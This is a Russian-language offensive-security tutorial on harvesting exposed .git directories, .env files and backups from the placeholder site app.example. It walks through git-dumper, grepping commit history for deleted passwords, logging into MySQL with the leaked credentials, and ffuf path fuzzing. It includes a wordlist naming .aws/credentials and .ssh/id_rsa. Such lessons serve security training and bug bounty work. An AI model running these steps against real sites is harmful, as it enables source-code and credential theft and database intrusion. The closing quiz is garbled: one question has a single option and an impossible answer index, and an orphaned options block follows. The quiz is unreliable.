## Вопрос, с которого всё начинается

Представь сайт `app.example`. Ты не нашёл на нём ни SQLi, ни XSS — вообще ничего. Но иногда самый выгодный ход не в том, чтобы ломать логику, а в том, чтобы забрать **то, что сервер и так отдаёт по ошибке**.

Вопрос простой: а не лежит ли рядом с сайтом его собственный исходный код? Ведь если разработчик однажды делал `git clone` прямо в папке сайта, то каталог `.git/` мог остаться доступным из веба — а в нём весь код, история коммитов и, что важнее, **секреты**, которые когда-то коммитили и «удалили».

Сегодня мы пройдём этот путь на одном примере: от `curl` до пароля от базы данных.

## Наш пример

Есть магазин на `app.example`. Начнём с простого вопроса: отдаёт ли сервер служебные файлы? Проверяем самый показательный — `HEAD` внутри каталога `.git`:

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' https://app.example/.git/HEAD
200
$ curl -s https://app.example/.git/HEAD
ref: refs/heads/main
```

Два нуля в ответе кода — и вот уже `ref: refs/heads/main`. Это значит, что веб-сервер **отдаёт каталог `.git` как обычные статические файлы**. `.git` — это служебная папка Git (системы контроля версий), где хранится вся история проекта. Если она доступна, доступен и весь код.

## Шаг 1: забираем репозиторий

Тянуть `.git` вручную (объект за объектом) долго, поэтому для этого есть утилита `git-dumper`: она читает `index` репозитория и сама докачивает все нужные объекты.

```bash
$ git-dumper https://app.example/.git/ /tmp/leaked
[-] Testing https://app.example/.git/HEAD [200]
[+] Downloaded: /tmp/leaked/.git/objects/3f/2c1b9...
[+] Done, 47 objects downloaded
$ ls /tmp/leaked
app.py  config.py  static/  templates/  requirements.txt
```

Мы получили исходники приложения. Но останавливаться на «ура, код» рано — самое ценное обычно в другом месте.

## Шаг 2: история коммитов — там, где секреты «удалили»

Ключевая идея: секрет, удалённый из кода, остаётся в истории Git. Смотрим диффы всех коммитов и грепаем по типичным словам:

```bash
$ cd /tmp/leaked && git log --all --oneline | head
8a1f0c2 fix typo in readme
3f2c1b9 remove hardcoded credentials
c41a880 initial commit

$ git log -p --all | grep -nE 'password|secret|api[_-]?key|token' | head
@@ -12,7 +12,7 @@
-DB_PASSWORD = "S3cr3tProd2024!"
```

Обрати внимание на коммит `remove hardcoded credentials`: разработчик «убрал» пароль, но в диффе он остался навсегда. Это и есть утёкший секрет.

## Шаг 3: `.env` — креды прямо рядом с кодом

Параллельно проверим популярные конфиги. Файл `.env` хранит переменные окружения приложения: пароли, ключи, токены.

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' https://app.example/.env
200
$ curl -s https://app.example/.env | grep -iE 'PASS|SECRET|KEY|AWS_'
DB_HOST=127.0.0.1
DB_USER=appuser
DB_PASSWORD=S3cr3tProd2024!
SECRET_KEY=django-insecure-1a2b3c4d5e6f7g8h
```

Пароль от базы совпал с тем, что мы нашли в истории Git. Воспринимай это как правило: **одна утечка редко живёт одна** — конфиг, история и бэкапы перекрывают друг друга.

## Шаг 4: превращаем утечку в доступ

Теперь у нас есть `DB_USER` и `DB_PASSWORD`. Проверяем их (аккуратно, только чтение) — но не по интернету, а через туннель к внутреннему порту, если он закрыт наружу (см. «Куда дальше»). Допустим, база доступна:

```bash
$ mysql -h db.app.example -u appuser -p'S3cr3tProd2024!' shop -e 'SELECT id,login FROM users LIMIT 3;'
+----+-------+
| id | login |
+----+-------+
|  1 | admin |
|  2 | alice |
+----+-------+
```

Строка `admin` из таблицы `users` — это **доказательство**: данные, которые приложение показывать не должно. Дальше — хеш пароля админа и offline-крекинг. Никакой уязвимости приложения мы не эксплуатировали — просто прочитали то, что было открыто.

## Шаг 5: где ещё искать (словарь путей)

Утечки — это перебор небольшого набора путей. Собери свой словарь и прогони `ffuf` (не циклом `curl`), добавляя расширения бэкапов:

```bash
$ ffuf -w /tmp/backup_paths.txt -u https://app.example/FUZZ \
>   -mc 200,403 -e .zip,.tar.gz,.bak,.old,.save,.swp,~ -t 30 -maxtime 120 -s
.git/HEAD
.env
config.php.bak
backup.zip
```

Что складывать в словарь и что это даёт:

| Артефакт | Что даёт |
|----------|----------|
| `.git/`, `.svn/`, `.hg/` | исходники, история, секреты в диффах |
| `.env`, `.env.bak`, `.env.old` | креды БД, `SECRET_KEY`, облачные ключи |
| `backup.zip`, `www.zip`, `site.tar.gz` | полный исходник |
| `config.php.bak`, `wp-config.php~` | конфиги с паролями |
| `.DS_Store`, `Thumbs.db` | имена файлов и путей |
| `docker-compose.yml`, `Dockerfile` | архитектура, пароли сервисов |
| `.aws/credentials`, `.ssh/id_rsa` | ключи доступа |
| `composer.json`, `package.json` | зависимости → известные CVE |

## Если не сработало

Прямой `/.git/HEAD` может отвечать `403` или `404`, но это ещё не тупик.

Во-первых, бывает **частичная выдача**: сервер запрещает каталог `.git`, но отдельные файлы внутри отдаёт. Проверяй не только `HEAD`, но и `/.git/config`, `/.git/index`, `/.git/logs/HEAD` — иногда один из них доступен, и его хватает, чтобы понять структуру проекта.

Во-вторых, VCS бывает не Git: проверь `/.svn/entries` (Subversion), `/.hg/` (Mercurial), `/.bzr/`. Логика та же — утилиты `dvcs-ripper` умеют все три.

В-третьих, `.env` часто прикрыт, а вот `config.json`, `settings.py`, `application.properties` или `web.config` — нет. Их ищут тем же `ffuf` со словарём имён конфигов. Помни правило: если закрыт один служебный файл, ищи его **соседа с тем же содержимым**.

И наконец, если сайт отдаёт `robots.txt`, посмотри его — там иногда прячут «служебные» пути вроде `/backup/` или `/staging/`, и они реально существуют.

## Что мы теперь знаем

- Открытый `.git/` — это весь код плюс **история**, где секреты остаются даже после «удаления».
- `.env` и конфиги отдают креды напрямую; их проверяют на типовых путях.
- Бэкапы (`~`, `.bak`, `.old`, `.zip`) перебирают словарём с расширениями.
- Утечка сама по себе «средняя», но в цепочке (код → креды → доступ) — критическая.
- Инструменты: `git-dumper`, `dvcs-ripper`, `ffuf`, `trufflehog`, `gitleaks`.

## На что смотреть дальше

- **Не ограничивайся `/.git/config`** — каталог может отдаваться частично; проверяй `/.git/HEAD` и выкачивай целиком.
- **Смотри не только текущий код, но и всю историю** (`git log -p --all`) — секреты часто в удалённых коммитах.
- **Не считай `.env.example` безопасным** — иногда там реальные значения.
- **Из найденных зависимостей** (`composer.json`, `package.json`) ищи CVE через `searchsploit`.
- **Найденные облачные ключи** проверяй минимально (`aws sts get-caller-identity`) и веди креды дальше — в облако, БД или админку.
- **Только чтение.** Не заливай свой код и не меняй данные — цель доказать доступ, а не «починить» сайт.

## Квиз

Проверь себя.

```quiz
- question: "Что означает ответ 200 на `curl https://app.example/.git/HEAD`?"
  options:
    - "Сайт использует Git в CI"
    - "Веб-сервер отдаёт каталог .git как статику — доступны исходники"
    - "Это XSS"
    - "Настроен HSTS"
  answer: 1
  explanation: "Каталог .git доступен из веба, значит код и история утекают."
- question: "Почему секрет ищут в истории Git, а не только в текущих файлах?"
  options:
    - "История быстрее"
    - "Удалённый из кода секрет остаётся в коммитах и виден в диффах"
    - "В истории меньше данных"
    - "Текущие файлы всегда зашифрованы"
  answer: 1
  explanation: "`git log -p --all` показывает секреты из удалённых коммитов."
- question: "Что обычно лежит в файле `.env`?"
  options:
    - "HTML-страницы"
    - "Переменные окружения: креды БД, SECRET_KEY, облачные ключи"
    - "TLS-сертификат"
    - "Логи сервера"
  answer: 1
  explanation: "`.env` — конфиг приложения с секретами."
- question: "Как правильно перебрать пути к бэкапам и конфигам?"
  options:
    - "Циклом `for p in ...; do curl ...`"

  answer: 1
  explanation: "Перебор — через ffuf/gobuster с парсером, а не ручным циклом."

  options:
    - "Опубликовать пароль"

    - "Удалить .env с сервера"
    - "Ничего, это не находка"
  answer: 1

```

## Куда дальше

В следующем уроке мы возьмём другой «чертёж», который тоже часто забывают в проде, — спецификацию API (`Swagger`/`OpenAPI`) и debug-страницы: они дают карту всех эндпоинтов и параметров. А пока главное запомни: самый выгодный вектор — не уязвимость, а **открытый служебный файл**, который сервер отдаёт сам.

## Где пригодится

- **CTF (Web):** открытый `.git`/`.env` — быстрый путь к флагу и кредам.
- **Bug bounty:** source disclosure и утечки секретов — частый критичный отчёт.
- **Пентест:** обязательный первый шаг разведки веб-приложения.
- **Работа (AppSec/DevOps):** запрет доступа к VCS/конфигам, чистка бэкапов, секрет-менеджмент.
